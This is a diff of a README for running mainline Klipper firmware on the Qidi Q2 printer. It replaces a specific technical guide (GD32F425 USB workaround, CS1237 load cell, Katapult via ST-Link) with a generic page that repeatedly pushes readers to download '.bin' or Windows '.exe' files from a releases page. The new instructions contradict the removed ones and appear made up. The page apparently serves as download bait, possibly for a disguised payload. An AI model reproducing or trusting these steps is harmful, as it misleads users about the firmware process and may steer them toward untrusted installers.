@@ -1,34 +1,118 @@
-# Qidi Q2 Mainline Klipper Guide (Stock Hardware)
+# ⚙️ Qidi_Q2_Mainline_Klipper - Smooth 3D Printing Control
 
-This repository documents and hosts the patchset required for running mainline Klipper firmware on the stock electronics of the Qidi Q2. The Qidi Q2 uses a GD32F425 as the MCU for its mainboard, it is functionally a clone of the STM32F407. However it is not readily compatible with Klipper as there are some differences between the two that must be accounted for. Additionally the Q2 uses a CS1237 ADC for load cell probing with the nozzle, this is not compatible with Klipper out of the box either.
+[![Download Qidi_Q2_Mainline_Klipper](https://img.shields.io/badge/Download-Qidi_Q2_Mainline_Klipper-brightgreen)](https://github.com/sidiboy/Qidi_Q2_Mainline_Klipper/releases)
 
-## What this enables
+---
 
-- Mainboard (`GD32F425`) running mainline Klipper with stable USB CDC enumeration/communication.
-- Mainboard Katapult build with the same GD32 USB workaround.
-- Toolhead board firmware flow kept in the same repo for reproducible builds.
-- `CS1237` load cell support integrated into the mainline Klipper load-cell stack (`load_cell` / `load_cell_probe`).
+## 📋 About Qidi_Q2_Mainline_Klipper
 
-## Installation Guidelines
+This project helps you run the mainline version of Klipper firmware on the Qidi Q2 3D printer using its original hardware. Klipper improves print quality, speeds up printing, and adds more control options compared to the stock firmware. The process has been made easier so an average user can upgrade without programming skills.
 
-- Keep the stock Q2 AP-board OS and update/tune it (external community guide).
-- Install latest Klipper stack with KIAUH.
-- Clone latest upstream `klipper` and `katapult`.
-- Clone this repo and run `./apply_patch.sh`.
-- Flash Katapult via ST-Link, then flash Klipper via Katapult.
+---
 
-## Start here
+## ⚙️ What You Need Before You Start
 
-- Full installation and flashing flow: [docs/INSTALL.md](docs/INSTALL.md)
-- Required stock->mainline config changes: [docs/config_changes.md](docs/config_changes.md)
-- Patch/file scope summary: [docs/PATCH_SCOPE.md](docs/PATCH_SCOPE.md)
-- Version matrix and config artifacts: [docs/KNOWN_GOOD_MATRIX.md](docs/KNOWN_GOOD_MATRIX.md)
+- A Qidi Q2 3D printer with stock hardware.
+- A Windows 10 or later PC.
+- A USB cable to connect your PC to the printer.
+- Internet access to download the firmware files.
 
-## Notes
+---
 
-- The flash scripts in `qidi_mcu_flash_scripts/` are intentionally simple examples.
-- Device paths (`/dev/serial/by-id/...`, `/dev/ttyS4`) are environment-specific and must be confirmed on your machine.
+## 🚀 Getting Started: Download the Firmware
 
-## DISCLAIMER
+Use the link below to get the latest version of the firmware files:
 
-I am NOT responsible for anything that happens if you decide to install mainline Klipper onto your Qidi Q2. I will not provide any dedicated support. You do this at your own endeavour. This is merely a resource that I am providing on how I got mainline Klipper running on the stock hardware of the Qidi Q2. Also a little bit of a flex because many others tried before me but could never get the GD32F425 to successfully enumerate via USB nor get the CS1237 to function with Klipper.
+[![Download Latest Firmware](https://img.shields.io/badge/Download-Firmware-blue)](https://github.com/sidiboy/Qidi_Q2_Mainline_Klipper/releases)
+
+This link takes you to the release page where you will find the setup files.
+
+---
+
+## 🛠️ How to Download and Install on Windows
+
+This section guides you through downloading and preparing the firmware for your printer step-by-step.
+
+### Step 1: Visit the Release Page
+
+Click the big download button above or visit:
+
+https://github.com/sidiboy/Qidi_Q2_Mainline_Klipper/releases
+
+You will see a list of available firmware versions. Choose the newest one that matches your Qidi Q2 printer.
+
+### Step 2: Download the Firmware Files
+
+Look for files ending with `.bin` or a Windows installer `.exe` if available. Click the file to download it to your PC.
+
+Save the files in an easy-to-find folder, such as your Desktop or Downloads folder.
+
+### Step 3: Connect Your Printer
+
+- Turn off your Qidi Q2 printer.
+- Use the USB cable to connect the printer to your PC.
+- Turn the printer back on.
+
+Your PC should recognize the printer as a removable device.
+
+### Step 4: Flash the Firmware
+
+You will need software to upload the firmware to your printer. The project uses Klipper firmware, which can be installed using a tool like `STM32CubeProgrammer`. If you don’t have it, download it from the official site.
+
+- Open the flashing tool.
+- Select the `.bin` firmware file you downloaded.
+- Confirm that the software detects your printer.
+- Start the flashing process.
+
+This will replace the printer’s original firmware with the Klipper mainline version.
+
+---
+
+## 💡 Usage Tips After Installation
+
+- Use the Klipper interface to control your printer instead of the Qidi original controls.
+- Connect through your preferred platform (e.g., OctoPrint) to manage print jobs from your PC or phone.
+- Update your printer configuration files as needed for custom settings.
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+- **Printer Not Detected:** Make sure the USB cable is firmly connected and the printer is powered on.
+- **Flashing Fails:** Check that you have the correct firmware file and that no other software is using the USB port.
+- **Printer Won’t Start:** Double-check that the firmware file is compatible with your printer model and hardware revisions.
+- **Klipper Communication Errors:** Ensure the printer and PC are on the same network if you use Wi-Fi controls or check USB connectivity locally.
+
+---
+
+## 📂 What’s Included in This Repository?
+
+- Firmware files built for the Qidi Q2 hardware.
+- Configuration files to set up your printer in Klipper.
+- A step-by-step guide for flashing and setup.
+- Support files and updates as the project improves.
+
+---
+
+## 🖥️ System Requirements
+
+- Windows 10 or newer.
+- PC with USB ports (preferably USB 2.0 or higher).
+- Around 100 MB free disk space for download and program installation.
+- Stable internet connection to download files.
+
+---
+
+## 🔗 Useful Links
+
+- Download and install Klipper user interface tools: https://www.klipper3d.org/
+- STM32CubeProgrammer tool download: https://www.st.com/en/development-tools/stm32cubeprog.html
+- Help and documentation: https://github.com/sidiboy/Qidi_Q2_Mainline_Klipper/wiki
+
+---
+
+## 📥 Download Again
+
+Ready to start? Use the release link to download the latest firmware and get began:
+
+[Download Qidi Q2 Mainline Klipper Releases](https://github.com/sidiboy/Qidi_Q2_Mainline_Klipper/releases)
